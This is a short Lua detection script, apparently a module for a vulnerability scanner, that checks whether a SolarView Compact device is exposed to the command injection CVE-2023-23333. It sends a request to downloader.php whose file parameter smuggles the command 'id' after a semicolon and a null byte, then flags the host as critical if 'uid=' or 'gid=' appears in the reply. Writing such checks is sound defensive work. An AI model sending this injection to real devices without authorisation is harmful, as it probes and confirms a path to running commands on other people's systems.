-- AUTHOR: Mohamed Tarek @0xr00t3d
-- Reference: https://github.com/Timorlover/CVE-2023-23333

SCAN_TYPE = 2
BODY_MATCH = { "uid=", "gid=" }

function send_report(resp)
    Reports:add {
        name = "CVE-2023-23333",
        url = resp.url,
        risk = "Critical",
        description =
        "There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php. ",
    }
end

function scan_cve(path)
    local new_url = HttpMessage:urljoin(path)

    local status, resp = pcall(function()
        return http:send { url = new_url }
    end)

    if status ~= true then
        return
    end


    local body = resp.body

    if resp.status == 200 then
        if Matcher:match_body_once(body, BODY_MATCH) then
            send_report(resp)
        end
    end
end

function main()
    scan_cve("/downloader.php?file=%3Bid%00.zip")
end
